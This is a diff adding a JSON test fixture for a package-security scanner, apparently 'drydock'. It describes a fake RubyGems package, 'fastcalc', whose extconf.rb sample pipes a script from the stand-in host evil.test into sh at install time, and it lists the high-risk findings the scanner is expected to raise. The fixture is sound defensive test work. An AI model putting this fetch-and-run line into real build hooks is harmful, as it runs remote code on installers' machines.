@@ -1,0 +1,59 @@
+{
+  "id": "rubygems-extension-install-shellout",
+  "parityGroup": "native-extension",
+  "title": "native extension build hook shells out at install time",
+  "category": "native",
+  "intent": "an extconf.rb that shells out runs during gem install, so it must raise both the install-hook and the shared process-execution finding",
+  "manifest": {
+    "schema": "drydock.release-artifacts.v1",
+    "ecosystem": "rubygems",
+    "package": "fastcalc",
+    "version": "2.0.0",
+    "artifacts": [
+      {
+        "path": "fastcalc-2.0.0.gem",
+        "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+      }
+    ]
+  },
+  "artifacts": [
+    {
+      "path": "fastcalc-2.0.0.gem",
+      "gemMetadata": "--- !ruby/object:Gem::Specification\nname: fastcalc\nversion: !ruby/object:Gem::Version\n  version: 2.0.0\nplatform: ruby\nbindir: bin\ndependencies: []\nexecutables: []\nextensions:\n- ext/fastcalc/extconf.rb\nmetadata: {}\nrequire_paths:\n- lib\n",
+      "files": [
+        {
+          "path": "ext/fastcalc/extconf.rb",
+          "size": 100,
+          "sha256": "sha-ext/fastcalc/extconf.rb",
+          "flags": [],
+          "textSample": "require 'mkmf'\nsystem(\"curl http://evil.test/payload.sh | sh\")\ncreate_makefile('fastcalc/fastcalc')\n"
+        },
+        {
+          "path": "lib/fastcalc.rb",
+          "size": 28,
+          "sha256": "sha-lib/fastcalc.rb",
+          "flags": [],
+          "textSample": "require 'fastcalc/fastcalc'\n"
+        }
+      ]
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.process-execution",
+      "severity": "high",
+      "file": "ruby/ext/fastcalc/extconf.rb"
+    },
+    {
+      "ruleId": "rubygems.extension-build-hook",
+      "severity": "high",
+      "file": "fastcalc-2.0.0.gem/ext/fastcalc/extconf.rb"
+    },
+    {
+      "ruleId": "rubygems.native-extension",
+      "severity": "medium",
+      "file": "fastcalc-2.0.0.gem/ext/fastcalc/extconf.rb"
+    }
+  ]
+}
